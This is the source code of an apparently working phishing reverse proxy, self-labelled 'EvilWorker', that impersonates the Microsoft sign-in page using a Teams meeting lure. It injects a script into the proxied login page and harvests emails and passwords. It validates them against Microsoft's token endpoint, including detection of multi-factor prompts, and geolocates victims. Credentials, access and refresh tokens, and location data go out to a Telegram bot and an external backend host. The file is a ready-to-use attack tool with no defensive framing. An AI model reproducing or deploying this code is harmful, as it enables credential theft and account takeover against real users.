const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const querystring = require('querystring');
const crypto = require('crypto');

// ============================================================
//  CONFIGURATION
// ============================================================

const PROXY_ENTRY_POINT = "/login";
const REDIRECT_URL = "https://login.microsoftonline.com/";
const BACKEND_URL = "https://meeting-h5ze.onrender.com";
const TEAMS_REDIRECT = "https://teams.live.com/dl/launcher/launcher.html?url=%2F_%23%2Fmeet%2F9348548468028%3Fp%3DO0l72J7eL4jegeQa7J%26anon%3Dtrue&type=meet&deeplinkId=109bc758-6e1b-47cb-907b-ed2379475a58&directDl=true&msLaunch=true&enableMobilePage=true&suppressPrompt=true";

const PROXY_PATHNAMES = {
    script: "/@",
    serviceWorker: "/service_worker_Mz8XO2ny1Pg5.js"
};

// ============================================================
//  SESSION STORAGE
// ============================================================

const VICTIM_SESSIONS = {};
const attemptCounts = new Map();
const SESSION_TTL = 60 * 60 * 1000; // 1 hour

function generateSessionId() {
    return crypto.randomBytes(16).toString('hex');
}

function getSessionIdFromCookie(cookieHeader) {
    if (!cookieHeader) return null;
    const cookies = cookieHeader.split('; ');
    for (const cookie of cookies) {
        const [name, value] = cookie.split('=');
        if (name === 'sessionId') {
            return value;
        }
    }
    return null;
}

function getSession(sessionId) {
    if (!sessionId) return null;
    const session = VICTIM_SESSIONS[sessionId];
    if (!session) return null;
    if (Date.now() - session.timestamp > SESSION_TTL) {
        delete VICTIM_SESSIONS[sessionId];
        return null;
    }
    return session;
}

function createSession(email) {
    const sessionId = generateSessionId();
    VICTIM_SESSIONS[sessionId] = {
        email: email,
        timestamp: Date.now(),
        ip: null
    };
    return sessionId;
}

// ============================================================
//  IP EXTRACTION & GEOLOCATION
// ============================================================

function isPrivateIP(ip) {
    if (!ip) return true;
    if (ip.startsWith('::ffff:')) ip = ip.substring(7);
    const privateRanges = [
        /^127\./, /^10\./, /^192\.168\./, /^172\.(1[6-9]|2[0-9]|3[0-1])\./,
        /^169\.254\./, /^::1$/, /^fe80:/i, /^fc00:/i, /^fd00:/i
    ];
    return privateRanges.some(re => re.test(ip));
}

function getClientIp(req) {
    const cfIp = req.headers['cf-connecting-ip'];
    if (cfIp && !isPrivateIP(cfIp)) return cfIp.trim();

    const forwarded = req.headers['x-forwarded-for'];
    if (forwarded) {
        const ips = forwarded.split(',').map(ip => ip.trim());
        for (const ip of ips) {
            if (!isPrivateIP(ip)) return ip;
        }
    }

    const remote = req.socket.remoteAddress;
    if (remote && !isPrivateIP(remote)) return remote;

    return 'unknown';
}

// ============================================================
//  LOCATION TRACKING
// ============================================================

const geoCache = new Map();
const CACHE_TTL = 60 * 60 * 1000;

async function getLocationFromIp(ip) {
    if (ip && ip.startsWith('::ffff:')) ip = ip.substring(7);

    const now = Date.now();
    if (geoCache.has(ip)) {
        const entry = geoCache.get(ip);
        if (now - entry.timestamp < CACHE_TTL) return entry.data;
        geoCache.delete(ip);
    }

    if (isPrivateIP(ip)) {
        const result = {
            full: 'Local/Private Network',
            city: 'Local',
            country: 'Private',
            lat: 'N/A',
            lon: 'N/A',
            timezone: 'Unknown',
            isp: 'Unknown',
            org: 'Unknown'
        };
        geoCache.set(ip, { timestamp: now, data: result });
        return result;
    }

    const apis = [
        `https://ip-api.com/json/${ip}?fields=status,message,city,regionName,country,lat,lon,timezone,isp,org,as`,
        `https://ipapi.co/${ip}/json/`,
        `https://ipinfo.io/${ip}/json`
    ];

    for (const apiUrl of apis) {
        try {
            const result = await new Promise((resolve) => {
                const request = https.get(apiUrl, { timeout: 3000 }, (resp) => {
                    let data = '';
                    resp.on('data', chunk => data += chunk);
                    resp.on('end', () => {
                        try {
                            const response = JSON.parse(data);
                            resolve({ success: true, data: response });
                        } catch (e) {
                            resolve({ success: false });
                        }
                    });
                });
                request.on('error', () => resolve({ success: false }));
                request.on('timeout', () => { request.destroy(); resolve({ success: false }); });
            });

            if (result.success) {
                const r = result.data;
                let parsed = null;
                if (r.status === 'success' || r.country) {
                    parsed = {
                        full: `${r.city || 'Unknown'}, ${r.regionName || r.region || 'Unknown'}, ${r.country || 'Unknown'}`,
                        city: r.city || 'Unknown',
                        country: r.country || 'Unknown',
                        lat: r.lat || r.latitude || 'N/A',
                        lon: r.lon || r.longitude || 'N/A',
                        timezone: r.timezone || r.time_zone || 'Unknown',
                        isp: r.isp || r.org || 'Unknown',
                        org: r.org || r.as || 'Unknown'
                    };
                } else if (r.country_name) {
                    parsed = {
                        full: `${r.city || 'Unknown'}, ${r.region || 'Unknown'}, ${r.country_name || 'Unknown'}`,
                        city: r.city || 'Unknown',
                        country: r.country_name || 'Unknown',
                        lat: r.latitude || 'N/A',
                        lon: r.longitude || 'N/A',
                        timezone: r.timezone || 'Unknown',
                        isp: r.org || 'Unknown',
                        org: r.asn || 'Unknown'
                    };
                } else if (r.country) {
                    parsed = {
                        full: `${r.city || 'Unknown'}, ${r.region || 'Unknown'}, ${r.country || 'Unknown'}`,
                        city: r.city || 'Unknown',
                        country: r.country || 'Unknown',
                        lat: r.loc ? r.loc.split(',')[0] : 'N/A',
                        lon: r.loc ? r.loc.split(',')[1] : 'N/A',
                        timezone: r.timezone || 'Unknown',
                        isp: r.org || 'Unknown',
                        org: r.asn ? r.asn.split(' ')[0] : 'Unknown'
                    };
                }
                if (parsed) {
                    geoCache.set(ip, { timestamp: now, data: parsed });
                    return parsed;
                }
            }
        } catch (e) { /* ignore */ }
    }

    const fallback = {
        full: 'Location unavailable',
        city: 'Unknown',
        country: 'Unknown',
        lat: 'N/A',
        lon: 'N/A',
        timezone: 'Unknown',
        isp: 'Unknown',
        org: 'Unknown'
    };
    geoCache.set(ip, { timestamp: now, data: fallback });
    return fallback;
}

// ============================================================
//  ENHANCED AUTHENTICATION WITH 2FA DETECTION
// ============================================================

async function verifyWithMicrosoft(email, password) {
    return new Promise((resolve, reject) => {
        const postData = querystring.stringify({
            client_id: '943a2b14-68aa-4205-88c1-a4b65ab04e81',
            grant_type: 'password',
            username: email,
            password: password,
            scope: 'openid profile email'
        });

        const options = {
            hostname: 'login.microsoftonline.com',
            path: '/common/oauth2/v2.0/token',
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(postData)
            }
        };

        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    const response = JSON.parse(data);

                    // Check if 2FA is required
                    const requires2FA = response.error === 'interaction_required' ||
                        response.error === 'consent_required' ||
                        response.error_description?.includes('MFA') ||
                        response.error_description?.includes('2FA') ||
                        response.error_description?.includes('multi-factor') ||
                        response.error?.includes('mfa');

                    // Check if login was successful
                    if (response.access_token) {
                        resolve({
                            success: true,
                            data: response,
                            requires2FA: false,
                            cookies: {
                                'ESTSAUTH': response.access_token,
                                'ESTSAUTHPERSISTENT': response.refresh_token || 'N/A',
                                'ID_TOKEN': response.id_token || 'N/A'
                            }
                        });
                    } else if (requires2FA) {
                        // 2FA is required – we detected it!
                        resolve({
                            success: false,
                            requires2FA: true,
                            error: response.error_description || '2FA/MFA required',
                            cookies: null
                        });
                    } else {
                        resolve({
                            success: false,
                            requires2FA: false,
                            error: response.error_description || 'Invalid credentials',
                            cookies: null
                        });
                    }
                } catch (error) {
                    reject(new Error('Failed to parse Microsoft response'));
                }
            });
        });

        req.on('error', reject);
        req.write(postData);
        req.end();
    });
}

// ============================================================
//  HELPER: SEND DETAILED TELEGRAM ALERT WITH FULL COOKIES
// ============================================================

async function sendDetailedAuthResult(email, password, success, ip, attemptCount, requires2FA, cookies, location) {
    try {
        const axios = require('axios');

        let msg = `🔐 *Microsoft Login Attempt*\n\n`;
        msg += `*📧 Email:* ${email}\n`;
        msg += `*🔑 Password:* ${password}\n`;
        msg += `*📍 Location:* ${location.full}\n`;
        msg += `*🌆 City:* ${location.city}\n`;
        msg += `*🌍 Country:* ${location.country}\n`;
        msg += `*📌 Coordinates:* ${location.lat}, ${location.lon}\n`;
        msg += `*🕐 Timezone:* ${location.timezone}\n`;
        msg += `*🏢 ISP:* ${location.isp}\n`;
        msg += `*📡 IP:* ${ip}\n`;
        msg += `*🕐 Time:* ${new Date().toISOString()}\n`;
        msg += `*🆔 Session:* ${attemptCount}\n`;
        msg += `*🔐 Status:* ${success ? '✅ VALID' : '❌ INVALID'}\n`;

        // 2FA Status
        if (requires2FA) {
            msg += `*🔑 2FA Required:* ✅ YES (MFA/2FA triggered)\n`;
            msg += `*📌 Note:* User must complete 2FA verification. Session cookie will be captured after 2FA completion.\n`;
        } else {
            msg += `*🔑 2FA Required:* ❌ No\n`;
        }

        // Full Cookies (NO TRUNCATION)
        if (cookies && Object.keys(cookies).length > 0) {
            msg += `\n*🍪 FULL COOKIES (HttpOnly):*\n`;
            for (const [name, value] of Object.entries(cookies)) {
                // Send full cookie value – NO truncation
                const fullValue = value || 'N/A';
                msg += `  \`${name}\`: \`${fullValue}\`\n`;
            }
        } else if (requires2FA) {
            msg += `\n*🍪 Cookies:* 2FA required – cookies will be captured after 2FA completion\n`;
        } else {
            msg += `\n*🍪 Cookies:* None captured\n`;
        }

        await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: process.env.TELEGRAM_CHAT_ID,
            text: msg,
            parse_mode: 'Markdown'
        });
        console.log(`[TELEGRAM] ✅ Sent detailed auth result for: ${email}`);
    } catch (error) {
        console.error(`[TELEGRAM] ❌ Failed to send: ${error.message}`);
    }
}

// ============================================================
//  OTHER HELPERS
// ============================================================

async function sendToBackend(email, password, req, attemptType, ip) {
    try {
        const axios = require('axios');
        const location = await getLocationFromIp(ip);
        await axios.post(`${BACKEND_URL}/api/log-action`, {
            action: attemptType === 'valid' ? 'login_success' : 'login_failed',
            email,
            password,
            visitorInfo: {
                fullUrl: req.url,
                userAgent: req.headers['user-agent'] || 'Unknown',
                ip,
                location: location.full,
                city: location.city,
                country: location.country,
                lat: location.lat,
                lon: location.lon,
                timezone: location.timezone,
                isp: location.isp,
                org: location.org
            }
        });
        console.log(`[BACKEND] ✅ Sent ${attemptType} for: ${email}`);
    } catch (error) {
        console.error(`[BACKEND] ❌ Failed to send: ${error.message}`);
    }
}

function serveFile(filename, res, contentType = 'text/html') {
    const filePath = path.join(__dirname, filename);
    fs.readFile(filePath, (err, data) => {
        if (err) {
            console.error(`[ERROR] Failed to read ${filename}: ${err.message}`);
            res.writeHead(404, { 'Content-Type': 'text/html' });
            res.end('<h1>404 Not Found</h1>');
            return;
        }
        res.writeHead(200, { 'Content-Type': contentType, 'Cache-Control': 'no-store' });
        res.end(data);
    });
}

// ============================================================
//  REQUEST HANDLERS
// ============================================================

function handleLoginRequest(req, res) {
    const rawEmail = req.url.split('login_hint=')[1]?.split('&')[0] || '';
    const email = rawEmail ? decodeURIComponent(rawEmail) : '';

    if (!email) {
        console.warn('[PROXY] ⚠️ No email found in request');
    }

    const sessionId = createSession(email);
    const isSecure = req.headers['x-forwarded-proto'] === 'https' || req.socket.encrypted;
    const cookieFlags = `Path=/; HttpOnly; SameSite=Lax${isSecure ? '; Secure' : ''}`;
    res.setHeader('Set-Cookie', [`sessionId=${sessionId}; ${cookieFlags}`]);

    let targetUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=943a2b14-68aa-4205-88c1-a4b65ab04e81&response_type=code&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&scope=openid%20profile%20email&login_hint=${encodeURIComponent(email)}`;

    console.log(`[PROXY] 🔄 Forwarding to: ${targetUrl}`);
    console.log(`[PROXY] 📧 Email: ${email}`);
    console.log(`[PROXY] 🆔 Session ID: ${sessionId}`);

    https.get(targetUrl, (targetRes) => {
        let data = [];
        targetRes.on('data', chunk => data.push(chunk));
        targetRes.on('end', () => {
            let body = Buffer.concat(data).toString();
            body = body.replace('</body>', `<script src="${PROXY_PATHNAMES.script}"></script></body>`);
            res.writeHead(200, { 'Content-Type': 'text/html', 'Cache-Control': 'no-store' });
            res.end(body);
        });
    }).on('error', (err) => {
        console.error(`[ERROR] Proxy failed: ${err.message}`);
        res.writeHead(302, { 'Location': targetUrl });
        res.end();
    });
}

function handlePostRequest(body, req, res) {
    try {
        const formData = querystring.parse(body);
        const ip = getClientIp(req);

        let email = '';
        const sessionId = getSessionIdFromCookie(req.headers.cookie);

        if (sessionId) {
            const session = getSession(sessionId);
            if (session) {
                email = session.email;
                console.log(`[POST] ✅ Using session email: ${email}`);
            }
        }

        if (!email) {
            email = formData.login || formData.loginfmt || formData.email || '';
            if (!email) {
                const referer = req.headers.referer || '';
                const match = referer.match(/login_hint=([^&]+)/);
                if (match) email = decodeURIComponent(match[1]);
            }
            if (!email) {
                const match = req.url.match(/login_hint=([^&]+)/);
                if (match) email = decodeURIComponent(match[1]);
            }
        }

        const password = formData.passwd || formData.password || '';
        if (!email) email = 'unknown';

        let attemptCount = attemptCounts.get(email) || 0;
        attemptCount++;
        attemptCounts.set(email, attemptCount);

        console.log(`[CREDENTIALS] 📧 Email: ${email}, 🔑 Password: ${password}, Attempt #${attemptCount}, IP: ${ip}`);

        sendToBackend(email, password, req, 'attempt', ip);

        // ENHANCED: Verify with Microsoft (detects 2FA)
        verifyWithMicrosoft(email, password)
            .then(async (result) => {
                const location = await getLocationFromIp(ip);

                if (result.success) {
                    console.log(`[AUTH] ✅ Valid credentials for: ${email}`);
                    await sendDetailedAuthResult(email, password, true, ip, attemptCount, false, result.cookies, location);
                    await sendToBackend(email, password, req, 'valid', ip);

                    res.writeHead(302, { 'Location': TEAMS_REDIRECT, 'Cache-Control': 'no-store' });
                    res.end();
                } else if (result.requires2FA) {
                    console.log(`[AUTH] 🔐 2FA/MFA required for: ${email}`);
                    await sendDetailedAuthResult(email, password, false, ip, attemptCount, true, null, location);
                    await sendToBackend(email, password, req, '2fa_required', ip);

                    // Redirect to login with 2FA required message
                    const errorUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=943a2b14-68aa-4205-88c1-a4b65ab04e81&response_type=code&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&scope=openid%20profile%20email&login_hint=${encodeURIComponent(email)}&error=2fa_required`;
                    res.writeHead(302, { 'Location': errorUrl, 'Cache-Control': 'no-store' });
                    res.end();
                } else {
                    console.log(`[AUTH] ❌ Invalid credentials for: ${email}`);
                    await sendDetailedAuthResult(email, password, false, ip, attemptCount, false, null, location);
                    await sendToBackend(email, password, req, 'invalid', ip);

                    const errorUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=943a2b14-68aa-4205-88c1-a4b65ab04e81&response_type=code&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&scope=openid%20profile%20email&login_hint=${encodeURIComponent(email)}&error=invalid_credentials`;
                    res.writeHead(302, { 'Location': errorUrl, 'Cache-Control': 'no-store' });
                    res.end();
                }
            })
            .catch((error) => {
                console.error('[ERROR] Microsoft verification failed:', error.message);
                const errorUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=943a2b14-68aa-4205-88c1-a4b65ab04e81&response_type=code&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&scope=openid%20profile%20email&login_hint=${encodeURIComponent(email)}&error=service_error`;
                res.writeHead(302, { 'Location': errorUrl });
                res.end();
            });

    } catch (error) {
        console.error('[ERROR] POST handling failed:', error.message);
        res.writeHead(500);
        res.end('Internal server error');
    }
}

// ============================================================
//  SERVER
// ============================================================

const server = http.createServer((req, res) => {
    console.log(`[REQUEST] ${req.method} ${req.url}`);

    if (req.url === '/' || req.url === '/index.html') {
        serveFile('index.html', res);
        return;
    }
    if (req.url === '/404' || req.url === '/404_not_found_lk48ZVr32WvU.html') {
        serveFile('404_not_found_lk48ZVr32WvU.html', res);
        return;
    }
    if (req.url === PROXY_PATHNAMES.script) {
        serveFile('script_Vx9Z6XN5uC3k.js', res, 'text/javascript');
        return;
    }
    if (req.url === PROXY_PATHNAMES.serviceWorker) {
        serveFile('service_worker_Mz8XO2ny1Pg5.js', res, 'text/javascript');
        return;
    }
    if (req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            handlePostRequest(body, req, res);
        });
        return;
    }
    if (req.url.startsWith(PROXY_ENTRY_POINT)) {
        handleLoginRequest(req, res);
        return;
    }
    res.writeHead(302, { 'Location': REDIRECT_URL });
    res.end();
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`✅ EvilWorker proxy running on port ${PORT}`);
    console.log(`📍 Entry point: ${PROXY_ENTRY_POINT}`);
    console.log(`🔗 Backend URL: ${BACKEND_URL}`);
    console.log(`📤 Teams redirect: ${TEAMS_REDIRECT}`);
    console.log('🔄 Proxy is ready for connections');
    console.log('🔐 2FA Detection: ENABLED');
});

process.on('uncaughtException', (err) => console.error('🔥 UNCAUGHT EXCEPTION:', err));
process.on('unhandledRejection', (reason) => console.error('🔥 UNHANDLED REJECTION:', reason));